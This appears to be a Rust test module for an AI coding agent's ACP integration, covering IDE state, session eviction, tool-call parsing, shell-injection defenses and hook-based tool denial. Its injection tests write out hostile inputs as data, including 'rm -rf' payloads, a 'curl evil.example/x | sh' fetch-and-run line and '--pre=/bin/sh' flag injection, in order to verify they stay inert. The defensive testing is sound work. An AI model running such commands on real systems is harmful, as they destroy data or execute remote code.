        assert_eq!(state.active_file.as_deref(), Some("/a.rs"));
        assert_eq!(state.recent_files, vec!["/a.rs", "/c.rs", "/b.rs"]);
    }

    #[test]
    fn recent_files_ring_is_capped() {
        let mut state = IdeState::default();
        for i in 0..20 {
            apply_ide_file_opened(&mut state, &json!({"filePath": format!("/f-{i}.rs")}));
        }
        assert_eq!(state.recent_files.len(), IDE_FILE_RING_CAP);
        // Most recent first.
        assert_eq!(state.recent_files[0], "/f-19.rs");
    }

    #[test]
    fn file_closed_clears_active_only_when_matching() {
        let mut state = IdeState::default();
        apply_ide_file_opened(&mut state, &json!({"filePath": "/foreground.rs"}));
        // Closing a background file doesn't touch foreground.
        apply_ide_file_closed(&mut state, &json!({"filePath": "/background.rs"}));
        assert_eq!(state.active_file.as_deref(), Some("/foreground.rs"));

        apply_ide_file_closed(&mut state, &json!({"filePath": "/foreground.rs"}));
        assert!(state.active_file.is_none());
    }

    #[test]
    fn selection_changed_computes_line_count() {
        let mut state = IdeState::default();
        apply_ide_selection_changed(
            &mut state,
            &json!({
                "filePath": "/x.rs",
                "text": "selected lines",
                "selection": {
                    "start": {"line": 10, "character": 0},
                    "end":   {"line": 12, "character": 0},
                }
            }),
        );
        let sel = state.selection.as_ref().unwrap();
        assert_eq!(sel.file_path, "/x.rs");
        assert_eq!(sel.line_start, 10);
        // 10..=12 = 3 lines
        assert_eq!(sel.line_count, 3);

        // Empty-text notification drops the selection.
        apply_ide_selection_changed(&mut state, &json!({"filePath": "/x.rs", "text": ""}));
        assert!(state.selection.is_none());
    }

    #[test]
    fn diagnostics_replace_per_file() {
        let mut state = IdeState::default();
        apply_ide_diagnostics(
            &mut state,
            &json!({
                "filePath": "/x.rs",
                "diagnostics": [
                    {"line": 3, "severity": "error", "message": "E0308",
                     "source": "rustc"}
                ]
            }),
        );
        assert_eq!(state.diagnostics.get("/x.rs").unwrap().len(), 1);
        assert_eq!(state.diagnostics["/x.rs"][0].severity, "error");

        // New set replaces rather than appends.
        apply_ide_diagnostics(
            &mut state,
            &json!({
                "filePath": "/x.rs",
                "diagnostics": [
                    {"line": 5, "severity": "warning", "message": "unused_var"},
                    {"line": 8, "severity": "warning", "message": "dead_code"},
                ]
            }),
        );
        let diags = state.diagnostics.get("/x.rs").unwrap();
        assert_eq!(diags.len(), 2);
        assert_eq!(diags[0].line, 5);
        assert_eq!(diags[1].line, 8);

        // Empty-diagnostics notification clears the file's entries.
        apply_ide_diagnostics(&mut state, &json!({"filePath": "/x.rs", "diagnostics": []}));
        assert!(!state.diagnostics.contains_key("/x.rs"));
    }

    #[test]
    fn malformed_payloads_are_dropped_not_panicked() {
        let mut state = IdeState::default();
        // Missing filePath.
        apply_ide_file_opened(&mut state, &json!({}));
        apply_ide_file_closed(&mut state, &json!({}));
        apply_ide_selection_changed(&mut state, &json!({"text": ""}));
        apply_ide_diagnostics(&mut state, &json!({}));
        assert!(state.active_file.is_none());
        assert!(state.selection.is_none());
        assert!(state.diagnostics.is_empty());
    }
}

// ============================================================================
// LRU-bound tests for #759 — session_map must not grow unbounded
// ============================================================================

#[cfg(test)]
mod session_lru_tests {
    use super::{upsert_session_mapping_into, MAX_ACP_SESSIONS};
    use std::collections::{HashMap, VecDeque};

    /// Inserting up to the cap MUST NOT evict — only inserting one
    /// past it triggers eviction of the oldest entry.
    #[test]
    fn cap_evicts_oldest_only_when_full() {
        let mut map = HashMap::new();
        let mut order = VecDeque::new();
        let cap = 4usize;

        for i in 0..cap {
            upsert_session_mapping_into(
                &mut map,
                &mut order,
                cap,
                format!("acp-{i}"),
                format!("oc-{i}"),
            );
        }
        assert_eq!(map.len(), cap, "cap reached without eviction");

        // One past — oldest (acp-0) goes.
        upsert_session_mapping_into(
            &mut map,
            &mut order,
            cap,
            "acp-new".to_string(),
            "oc-new".to_string(),
        );
        assert_eq!(map.len(), cap, "post-eviction count is still at cap");
        assert!(!map.contains_key("acp-0"), "oldest entry must be evicted");
        assert_eq!(map.get("acp-new").map(String::as_str), Some("oc-new"));
    }

    /// Re-inserting the same key MUST bump it to the most-recent
    /// position, not duplicate it or move a different victim. A
    /// long-lived client re-loading the same session repeatedly
    /// would otherwise evict itself.
    #[test]
    fn reinsert_bumps_recency_no_duplicate() {
        let mut map = HashMap::new();
        let mut order = VecDeque::new();
        let cap = 3usize;

        for i in 0..cap {
            upsert_session_mapping_into(
                &mut map,
                &mut order,
                cap,
                format!("acp-{i}"),
                format!("oc-{i}"),
            );
        }
        // Touch acp-0 — should now be the youngest.
        upsert_session_mapping_into(
            &mut map,
            &mut order,
            cap,
            "acp-0".to_string(),
            "oc-0".to_string(),
        );
        assert_eq!(order.len(), cap, "no duplicate inserted");
        assert_eq!(order.back().map(String::as_str), Some("acp-0"));
        assert_eq!(order.front().map(String::as_str), Some("acp-1"));

        // Now overflow — acp-1 (oldest) is evicted, not acp-0.
        upsert_session_mapping_into(
            &mut map,
            &mut order,
            cap,
            "acp-new".to_string(),
            "oc-new".to_string(),
        );
        assert!(
            map.contains_key("acp-0"),
            "recently-touched key must survive"
        );
        assert!(!map.contains_key("acp-1"), "oldest must be the evictee");
    }

    /// The hard-coded production cap is 64 — pin it so a future
    /// tuning change is visible in the diff (crosslink #759 mandated
    /// refactor cites this exact number).
    #[test]
    fn production_cap_pins_at_64() {
        assert_eq!(MAX_ACP_SESSIONS, 64);
    }
}

// ============================================================================
// Security tests for #688 — acp_search must NEVER shell-interpolate user input
// ============================================================================

#[cfg(test)]
mod search_security_tests {
    use super::{build_search_argv, resolve_program};
    use serde_json::Value;
    use std::collections::HashMap;

    fn args_from(pairs: &[(&str, &str)]) -> HashMap<String, Value> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), Value::String((*v).to_string())))
            .collect()
    }

    /// Shell metacharacters in the grep pattern become a single argv entry —
    /// they are NOT parsed by a shell, so `;`, `$(...)`, backticks, and `&&`
    /// are matched literally instead of executing arbitrary commands.
    #[test]
    fn grep_shell_metacharacters_in_pattern_are_literal_argv() {
        let cases = [
            "; rm -rf ~ ;",
            "$(rm -rf /)",
            "`id`",
            "foo && curl evil.example/x | sh",
            "' ; touch /tmp/pwn ; '",
        ];
        for raw in cases {
            let tool_args = args_from(&[("pattern", raw), ("path", ".")]);
            // Skip the test if `rg` is not installed in the sandbox.
            let Ok((program, argv)) = build_search_argv("grep", &tool_args) else {
                eprintln!("skipping: rg not on PATH");
                return;
            };

            // Whole argv must be exactly the fixed prefix + the literal
            // pattern + the literal path, with no concatenation.
            assert_eq!(
                argv,
                vec![
                    "--no-heading".to_string(),
                    "--".to_string(),
                    raw.to_string(),
                    ".".to_string(),
                ],
                "metacharacters were not preserved as a single argv entry"
            );
            // No element of argv may contain a shell-pipe / redirect
            // construct that the original code built (`2>/dev/null`,
            // `| head`). Those were the smoking gun of shell interpolation.
            for entry in &argv {
                assert!(
                    !entry.contains("2>/dev/null"),
                    "argv leaked a shell-redirect token: {entry}"
                );
                assert!(
                    !entry.contains("| head"),
                    "argv leaked a shell-pipe token: {entry}"
                );
            }
            // Program is an absolute, resolved path — not a bare name.
            assert!(
                program.is_absolute(),
                "program path is not absolute: {}",
                program.display()
            );
        }
    }

    /// Glob tool: a malicious pattern containing closing quotes / command
    /// substitution must NOT escape into a `find` shell pipeline. The
    /// argv-based plan passes it straight to `-name`.
    #[test]
    fn glob_injection_pattern_is_literal_name_arg() {
        let evil = "' ; rm -rf ~ ; '";
        let tool_args = args_from(&[("pattern", evil), ("path", ".")]);
        let Ok((program, argv)) = build_search_argv("glob", &tool_args) else {
            eprintln!("skipping: find not on PATH");
            return;
        };
        assert_eq!(
            argv,
            vec![
                ".".to_string(),
                "-type".to_string(),
                "f".to_string(),
                "-name".to_string(),
                evil.to_string(),
            ]
        );
        for entry in &argv {
            assert!(
                !entry.contains("2>/dev/null") && !entry.contains('|'),
                "argv leaked shell metacharacters: {entry}"
            );
        }
        assert!(program.is_absolute());
    }

    /// `rg` is resolved to an absolute path via PATH lookup, not invoked by
    /// bare name. This ensures the binary actually executed is the one a
    /// reviewer can audit, and matches the test contract from #688.
    #[test]
    fn resolved_rg_program_is_absolute_path() {
        let Some(rg) = resolve_program("rg") else {
            eprintln!("skipping: rg not on PATH");
            return;
        };
        assert!(rg.is_absolute(), "rg path not absolute: {}", rg.display());
        assert_eq!(
            rg.file_name().and_then(|s| s.to_str()),
            Some("rg"),
            "resolved program is not `rg`: {}",
            rg.display()
        );
        // resolve_program rejects path-like names to prevent traversal.
        assert!(resolve_program("/etc/passwd").is_none());
        assert!(resolve_program("../evil").is_none());
        assert!(resolve_program("").is_none());
    }

    /// A pattern that begins with `-` (e.g. `--help`, `-A`, `--pre=`) must
    /// be passed AFTER the `--` argv terminator, so `rg` treats it as
    /// the search pattern instead of a flag. This blocks flag injection
    /// even when the attacker controls the pattern.
    #[test]
    fn grep_flag_injection_blocked_by_double_dash_terminator() {
        let attacker_patterns = [
            "--help",
            "-files-with-matches",
            "-A1000000",
            "--pre=/bin/sh",
        ];
        for pat in attacker_patterns {
            let tool_args = args_from(&[("pattern", pat), ("path", ".")]);
            let Ok((_, argv)) = build_search_argv("grep", &tool_args) else {
                eprintln!("skipping: rg not on PATH");
                return;
            };
            let dash_idx = argv
                .iter()
                .position(|s| s == "--")
                .expect("argv missing `--` terminator");
            let pat_idx = argv
                .iter()
                .position(|s| s == pat)
                .expect("argv missing the user-supplied pattern");
            assert!(
                pat_idx > dash_idx,
                "user-supplied pattern `{pat}` appeared before `--`; flag injection is NOT blocked"
            );
        }

        // Direct flag injection via the `type` and `glob` arguments is
        // refused at planning time — they would otherwise become their own
        // argv entries and could still be flags.
        let tool_args = args_from(&[("pattern", "x"), ("type", "--evil")]);
        assert!(build_search_argv("grep", &tool_args).is_err());
        let tool_args = args_from(&[("pattern", "x"), ("glob", "-rf")]);
        assert!(build_search_argv("grep", &tool_args).is_err());
    }
}

// ============================================================================
// Pre-tool gate tests for #694 — every ACP dispatch MUST run PreToolUse hooks
// and respect deny decisions. These tests exercise the gate in isolation so
// the regression is impossible without removing the hook engine wiring from
// `execute_tool_via_acp`.
// ============================================================================

#[cfg(test)]
mod message_history_tests {
    use super::decode_acp_messages;
    use serde_json::json;

    #[test]
    fn decode_acp_messages_accepts_valid_history() {
        let messages = vec![
            json!({"role": "user", "content": "hello"}),
            json!({"role": "assistant", "content": "hi"}),
        ];

        let decoded = decode_acp_messages(&messages).expect("valid ACP history must decode");

        assert_eq!(decoded.len(), 2);
        assert_eq!(decoded[0].role, "user");
        assert_eq!(decoded[1].role, "assistant");
    }

    #[test]
    fn decode_acp_messages_rejects_malformed_history() {
        let messages = vec![
            json!({"role": "user", "content": "hello"}),
            json!({"role": "assistant"}),
        ];

        let err = decode_acp_messages(&messages).expect_err("missing content must fail");

        assert!(err.contains("index 1"), "{err}");
        assert!(err.contains("content"), "{err}");
    }
}

#[cfg(test)]
mod tool_definition_tests {
    use super::acp_tool_definitions_for_chat_request;
    use serde_json::json;

    #[test]
    fn acp_tool_definitions_accept_registry_shape() {
        let tools = acp_tool_definitions_for_chat_request(crate::tools::get_tool_definitions())
            .expect("built-in tool registry must be valid for ACP chat requests");

        assert!(!tools.is_empty(), "ACP must advertise built-in tools");
        assert!(tools.iter().all(|tool| tool["type"] == "function"));
    }

    #[test]
    fn acp_tool_definitions_reject_non_array_registry_shape() {
        let err = acp_tool_definitions_for_chat_request(json!({"tools": []}))
            .expect_err("non-array registry shape must fail");

        assert!(err.contains("array"), "{err}");
        assert!(err.contains("object"), "{err}");
    }

    #[test]
    fn acp_tool_definitions_reject_malformed_tool_entry() {
        let err = acp_tool_definitions_for_chat_request(json!([
            {"type": "function", "function": {"parameters": {}}}
        ]))
        .expect_err("tool without function.name must fail");

        assert!(err.contains("function.name"), "{err}");
        assert!(err.contains("index 0"), "{err}");
    }

    #[test]
    fn acp_tool_definitions_reject_non_object_parameters() {
        let err = acp_tool_definitions_for_chat_request(json!([
            {"type": "function", "function": {"name": "bad", "parameters": []}}
        ]))
        .expect_err("tool with non-object parameters must fail");

        assert!(err.contains("bad"), "{err}");
        assert!(err.contains("parameters"), "{err}");
    }
}

#[cfg(test)]
mod stream_tool_call_tests {
    use super::{finish_acp_stream, AccumulatedToolCall, StreamResult};

    #[test]
    fn finish_stream_returns_complete_tool_calls() {
        let result = finish_acp_stream(
            "hello".to_string(),
            vec![AccumulatedToolCall {
                id: "call_1".to_string(),
                name: "bash".to_string(),
                arguments: r#"{"command":"pwd"}"#.to_string(),
            }],
        );

        match result {
            StreamResult::ToolCalls {
                content,
                tool_calls,
            } => {
                assert_eq!(content, "hello");
                assert_eq!(tool_calls.len(), 1);
                assert_eq!(tool_calls[0].id, "call_1");
                assert_eq!(tool_calls[0].name, "bash");
            }
            other => panic!("expected complete tool call to finish as ToolCalls, got {other:?}"),
        }
    }

    #[test]
    fn finish_stream_errors_on_incomplete_tool_call() {
        let result = finish_acp_stream(
            String::new(),
            vec![AccumulatedToolCall {
                id: "call_missing_name".to_string(),
                name: String::new(),
                arguments: r#"{"command":"pwd"}"#.to_string(),
            }],
        );

        match result {
            StreamResult::Error(message) => {
                assert!(message.contains("incomplete tool call"), "{message}");
                assert!(message.contains("function.name"), "{message}");
            }
            other => panic!("expected incomplete tool call to error, got {other:?}"),
        }
    }

    #[test]
    fn finish_stream_errors_on_missing_tool_call_id() {
        let result = finish_acp_stream(
            String::new(),
            vec![AccumulatedToolCall {
                id: String::new(),
                name: "bash".to_string(),
                arguments: r#"{"command":"pwd"}"#.to_string(),
            }],
        );

        match result {
            StreamResult::Error(message) => {
                assert!(message.contains("incomplete tool call"), "{message}");
                assert!(message.contains("id"), "{message}");
            }
            other => panic!("expected missing id to error, got {other:?}"),
        }
    }
}

#[cfg(test)]
mod tool_argument_tests {
    use super::parse_acp_tool_arguments;

    #[test]
    fn malformed_json_returns_tool_error() {
        let err =
            parse_acp_tool_arguments("bash", "not json {{").expect_err("malformed JSON must error");
        assert!(err.is_error);
        assert!(
            err.content.contains("Invalid tool arguments JSON"),
            "diagnostic must name malformed arguments: {:?}",
            err.content
        );
    }

    #[test]
    fn non_object_json_returns_tool_error() {
        let err = parse_acp_tool_arguments("bash", "[]").expect_err("array args must error");
        assert!(err.is_error);
        assert!(
            err.content.contains("expected a JSON object"),
            "diagnostic must reject non-object args: {:?}",
            err.content
        );
    }

    #[test]
    fn object_json_returns_hash_map_and_hook_input_value() {
        let (args, tool_input) = parse_acp_tool_arguments("bash", r#"{"command":"pwd"}"#)
            .expect("object args must parse");
        assert_eq!(
            args.get("command").and_then(serde_json::Value::as_str),
            Some("pwd")
        );
        assert_eq!(
            tool_input
                .get("command")
                .and_then(serde_json::Value::as_str),
            Some("pwd")
        );
    }
}

#[cfg(test)]
mod pre_tool_gate_tests {
    use super::pre_tool_use_gate;
    use crate::config::{Hook, HookEntry, HookPolicy, HooksConfig};
    use crate::hooks::HookEngine;
    use serde_json::json;
    use std::io::Write;

    /// Materialize a hook-script that exits with code 2 and emits
    /// `{"decision":"deny", "reason":"<reason>"}` on stdout. The hook
    /// engine reads stdout as JSON and treats both `exit == 2` AND
    /// `decision == "deny"` as a block — this is the simplest way to
    /// drive a real denial through the same code path proxy.rs uses.
    fn write_deny_script(dir: &std::path::Path, reason: &str) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let script = dir.join("deny.sh");
        let mut f = std::fs::File::create(&script).expect("create deny.sh");
        writeln!(
            f,
            "#!/bin/sh\necho '{{\"decision\":\"deny\",\"reason\":\"{reason}\"}}'\nexit 2"
        )
        .expect("write deny.sh");
        let mut perms = std::fs::metadata(&script).unwrap().permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&script, perms).expect("chmod deny.sh");
        script
    }

    fn allow_only(name: &str) -> HookPolicy {
        let mut s = std::collections::HashSet::new();
        s.insert(name.to_string());
        HookPolicy {
            allowed_commands: Some(s),
            ..Default::default()
        }
    }

    /// **Fix #694 — forensic evidence #1**
    ///
    /// A `PreToolUse` hook that denies a tool MUST cause `pre_tool_use_gate`
    /// to return `Some(AcpToolResult { is_error: true, .. })` and the
    /// block reason MUST surface in the result's `content`. Before the
    /// fix, `execute_local_tool` skipped this gate entirely and
    /// dispatched `execute_tool_with_memory` directly — a hook denial
    /// had no effect on the ACP path. This test fails (gate is `None`)
    /// when the wiring regresses.
    #[tokio::test]
    async fn hook_denial_blocks_tool_dispatch() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let script = write_deny_script(tmp.path(), "blocked-by-policy");

        let mut cfg = HooksConfig::default();
        cfg.pre_tool_use.push(HookEntry {
            matcher: None,
            hooks: vec![Hook::Command {
                command: script.to_string_lossy().to_string(),
                shell: false,
                timeout: 10,
            }],
        });
        cfg.policy = Some(allow_only("deny.sh"));
        let engine = HookEngine::new(cfg);

        let blocked = pre_tool_use_gate(&engine, "bash", &json!({"command": "ls"})).await;

        let blocked = blocked.expect(
            "PreToolUse denial MUST short-circuit the ACP dispatch — \
             gate returned None, which means the regression is back",
        );
        assert!(
            blocked.is_error,
            "blocked tool result must report is_error=true"
        );
        assert!(
            blocked.content.contains("blocked by PreToolUse hook"),
            "block reason must surface in content; got: {}",
            blocked.content
        );
    }

    /// **Fix #694 — forensic evidence #2**
    ///
    /// A `PreToolUse` hook configured with a matcher that DOES NOT match
    /// the dispatched tool MUST let the call through (`gate -> None`).
    /// Tools that aren't covered by a deny-listing rule run normally.
    /// This guards against an over-eager fix that just blocks everything.
    #[tokio::test]
    async fn allowed_tool_passes_through_gate() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let script = write_deny_script(tmp.path(), "denied");

        let mut cfg = HooksConfig::default();
        // Matcher only matches `Write` — calling `read_file` must pass.
        cfg.pre_tool_use.push(HookEntry {
            matcher: Some("Write".to_string()),
            hooks: vec![Hook::Command {
                command: script.to_string_lossy().to_string(),
                shell: false,
                timeout: 10,
            }],
        });
        cfg.policy = Some(allow_only("deny.sh"));
        let engine = HookEngine::new(cfg);

        let outcome =
            pre_tool_use_gate(&engine, "read_file", &json!({"file_path": "/tmp/some.txt"})).await;

        assert!(
            outcome.is_none(),
            "gate must not block a tool unmatched by any deny hook; got Some({outcome:?})"
        );
    }

    /// **Fix #694 — forensic evidence #3**
    ///
    /// An empty hooks config (no `PreToolUse` entries at all) MUST be
    /// treated as "allow everything". This pins the no-op behavior so
    /// a regression that defaults to deny-when-empty (the opposite
    /// failure mode) is also caught.
    #[tokio::test]
    async fn empty_hook_config_allows_all_tools() {
        let engine = HookEngine::new(HooksConfig::default());

        for (tool, args) in [
            ("bash", json!({"command": "echo hi"})),
            ("read_file", json!({"file_path": "/tmp/x.rs"})),
            (
                "write_file",
                json!({"file_path": "/tmp/y.rs", "content": "//"}),
            ),
            ("memory_save", json!({"key": "k", "value": "v"})),
            ("mcp__svc__op", json!({"arg": "v"})),
        ] {
            let outcome = pre_tool_use_gate(&engine, tool, &args).await;
            assert!(
                outcome.is_none(),
                "empty PreToolUse config must allow {tool}; got {outcome:?}"
            );
        }
    }

    /// **Fix #694 — forensic evidence #4**
    ///
    /// A `PreToolUse` matcher that DOES match the dispatched tool name
    /// fires the deny hook and the gate blocks. Complements
    /// `allowed_tool_passes_through_gate` to prove the matcher itself
    /// is wired correctly through the ACP code path.
    #[tokio::test]
    async fn matcher_match_triggers_deny() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let script = write_deny_script(tmp.path(), "bash-not-allowed");

        let mut cfg = HooksConfig::default();
        cfg.pre_tool_use.push(HookEntry {
            matcher: Some("bash".to_string()),
            hooks: vec![Hook::Command {
                command: script.to_string_lossy().to_string(),
                shell: false,
                timeout: 10,
            }],
        });
        cfg.policy = Some(allow_only("deny.sh"));
        let engine = HookEngine::new(cfg);

        let outcome = pre_tool_use_gate(&engine, "bash", &json!({"command": "rm -rf /"})).await;
        let blocked = outcome.expect("matcher-matched deny hook MUST block");
        assert!(blocked.is_error);
        assert!(
            blocked.content.contains("bash-not-allowed"),
            "deny reason must propagate; got: {}",
            blocked.content
        );
    }
}
